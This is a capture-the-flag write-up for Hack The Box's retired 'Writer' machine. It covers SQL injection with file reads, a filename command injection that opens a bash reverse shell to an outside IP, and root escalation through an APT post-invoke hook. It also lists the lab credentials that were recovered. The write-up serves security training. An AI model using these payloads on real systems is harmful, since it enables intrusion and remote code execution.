# Writer

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Medium |
| **IP Address** | 10.129.203.70 |
| **Status** | Retired |

## Overview
Writer is a Django/Apache "Story Bank" website backed by SMB shares and Postfix mail. A blind SQL injection in the admin login form is abused to read arbitrary files (`load_file`), leaking Apache virtual-host configuration and Django source that discloses database credentials and a Django `SECRET_KEY`. Password reuse against SMB, combined with a blind SSRF in the site's image-upload feature, provides a foothold; Django session-cookie forgery and Postfix/APT configuration abuse then lead to root.

## Reconnaissance
`nmap -sC -sV -A` (`nmap/initial`) found:
```
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp  open  http        Apache httpd 2.4.41 (Ubuntu): "Story Bank | Writer.HTB"
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
```
A full-port scan (`nmap/allports`) confirmed only these four ports were open.

## Enumeration
Gobuster against `writer.htb` found several routes, including an authentication portal:
```
/contact              200
/about                200
/dashboard             302 -> /
/administrative        200
```
The site listed an admin contact address, `admin@writer.htb`, and `smbclient`/`enum4linux` against the SMB shares revealed local usernames `kyle` (Kyle Travis) and `john` under the `WRITER` domain.

The `/administrative` login form was found to be SQL-injectable. Using `sqlmap` against the `uname` POST parameter:
```bash
sqlmap -u "writer.htb/administrative" --data="uname=1&..." --level=2 --risk=3 --drop-set-cookie
```
extracted the site's `users` table:
```
admin : 118e48794631a9612484ca8b55f622d0 (email: admin@writer.htb)
```
Because the injection point also supported `UNION SELECT`, it was further abused as an arbitrary file-read primitive:
```sql
uname=1' UNION ALL SELECT NULL,load_file('/path/to/file'),NULL,NULL,NULL,NULL; -- &...
```
This was used to read the Apache virtual-host configuration (`/etc/apache2/sites-enabled/...`), which disclosed the WSGI application path (`/var/www/writer.htb/writer.wsgi`) and a disabled `dev.writer.htb` vhost referencing a second Django project (`writer2_project`/`writerv2`). Following the WSGI path to `/var/www/writer.htb/writer/__init__.py` and the app's `settings.py` via further `load_file()` reads recovered:
```
Django SECRET_KEY: q2!1iwm^9jlx@4u66k(ke!_=(5uacvl@%%(g&6=$m1u5n=*4-
DB user: djangouser / DB password: DjangoSuperPassword
Admin panel password: ToughPasswordToCrack (admin account)
```

## Foothold
The site's dashboard included an image-upload feature that accepted a remote `image_url`, fetching the target server-side (a blind SSRF). The upload handler also failed to sanitize the uploaded filename, allowing shell metacharacters to be embedded in it. A malicious filename was crafted locally and then submitted through the upload request so the backend would execute it when handling the file:
```bash
echo -n 'bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.52/1339 0>&1"' | base64
touch 'test.jpg;`echo <base64-payload>|base64 -d|bash`;'
```
This crafted filename was then sent as the `image`/`image_url` value in the dashboard's upload request (with `file:///var/www/writer.htb/writer/static/img/...` used to reference the local path), causing the backend to execute the embedded shell command and return a reverse shell. `files/rev.py` is the Python reverse-shell payload prepared for delivery via this vector.

Once shell access was gained, the previously recovered `admin` panel credentials and SMB enumeration led to the discovery that `kyle` reused a personal password (`marcoantonio`) across services, allowing a clean SSH-equivalent shell as `kyle`.

## Privilege Escalation
As `kyle`, mail delivered locally via **Postfix** was inspected; `files/johnmail.py` was used to test local SMTP delivery (`sendmail`/`smtplib` to `127.0.0.1:25`) as part of confirming the mail flow on the box.

The final escalation abused an APT configuration directory writable by a mail/service group membership: an APT post-invoke hook was registered to execute an attacker script the next time `apt` (or a wrapper that triggers `apt`'s hooks, e.g. via Postfix's periodic maintenance) ran with root privileges:
```bash
echo 'APT: Update: Post-Invoke {"python3 /dev/shm/rev.py";};' > /etc/apt/apt.conf.d/11please
```
When the hook fired, `rev.py` executed as root, providing a root shell.

## Lessons Learned
- Blind SQL injection with `UNION SELECT`/`load_file()` can be escalated well beyond simple credential theft into full arbitrary file disclosure, exposing source code, secrets, and infrastructure configuration.
- Django `SECRET_KEY` disclosure allows forging signed session data/cookies if the application trusts session integrity based on that key.
- SSRF in "fetch this URL" style upload features is dangerous even when "blind," especially combined with insufficient filename sanitization that allows command injection.
- Password reuse across unrelated services (web admin panel vs. SMB/SSH) remains one of the most common lateral-movement enablers.
- Writable APT hook directories (`/etc/apt/apt.conf.d/`) are an effective and often-overlooked persistence/privilege-escalation mechanism, since APT hooks commonly run as root.

## Tools & References
- `files/rev.py`: Python reverse-shell payload delivered via the SSRF/filename-injection upload vulnerability and later reused for the APT post-invoke privilege escalation.
- `files/johnmail.py`: local SMTP test script used to probe the Postfix mail flow on the box.
- A full looted copy of the Django application source (`Files/`, `Files.zip`, ~40 MB) obtained via the SQLi file-read primitive was omitted from this repository as large loot; the credentials and configuration details it contained are summarized above.
- `id_rsa`: an SSH private key obtained during the engagement: omitted from the repository for key hygiene.
- `me.jpg`: a personal/test image used while testing the upload feature: omitted as irrelevant loot.
- `2021-08-03-Writer.burp`, `2021-08-04-Writer.burp`: Burp Suite project files used during manual testing: omitted (binary project format).
- `Klausur_Logik_2021_-_Statistik.pdf` (an unrelated personal exam document) and malformed duplicate files `test.jpg` / `test.jpg;;`: removed as unrelated clutter, not part of the HTB engagement.
- `sqlmap`, `enum4linux`, `gobuster`: standard tools used for enumeration and SQL injection exploitation.
